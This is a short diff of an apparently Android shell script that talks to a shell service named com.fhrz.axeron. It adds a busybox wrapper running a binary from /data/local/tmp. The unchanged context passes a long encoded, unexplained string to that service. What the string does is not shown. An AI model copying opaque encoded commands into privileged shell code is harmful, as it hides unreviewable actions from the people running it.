@@ -39,6 +39,10 @@ shellstorm() {
   am stopservice -n com.fhrz.axeron/.ShellStor > /dev/null
 }
 
+busybox() {
+ /data/local/tmp/busybox $@
+}
+
 devcore() {
  echo $(shellstorm "ARM17:16TXsNew16zXr9a21qvWq9ey167Xtde21qzWrNat1qrXo9el17DXpNex157Wqtel16vWq9ed17TXodeu16vXqtar16/XpNeh16jXqNar153XtNeh167Xq9eq15/Xq9eu16HWqtev16Q=" $(dirname $0))
 }
